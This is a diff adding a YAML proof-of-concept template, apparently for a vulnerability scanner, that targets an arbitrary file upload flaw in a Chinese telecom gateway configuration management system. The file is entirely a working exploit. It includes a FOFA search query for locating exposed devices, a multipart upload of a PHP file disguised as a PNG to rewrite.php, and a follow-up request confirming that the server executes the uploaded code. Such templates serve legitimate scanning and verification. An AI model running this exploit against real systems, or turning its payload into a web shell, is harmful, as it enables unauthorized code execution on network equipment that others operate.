@@ -1,0 +1,39 @@
+id: poc-yaml-Telecom-gateway-rewrite-php-anyfile-upload
+info:
+  name: 电信网关配置管理系统 rewrite.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 电信网关配置管理系统
+  fofa: body="img/login_bg3.png" && body="系统登录"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /manager/teletext/material/rewrite.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+  data: '------WebKitFormBoundaryOKldnDPT
+
+    Content-Disposition: form-data; name="tmp_name"; filename="{{.t1}}.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundaryOKldnDPT
+
+    Content-Disposition: form-data; name="uploadtime"
+
+
+
+    ------WebKitFormBoundaryOKldnDPT--'
+  expression: "status_code == 200 && \ncontains(body,\"success\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+- method: GET
+  path: /xmedia/material/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
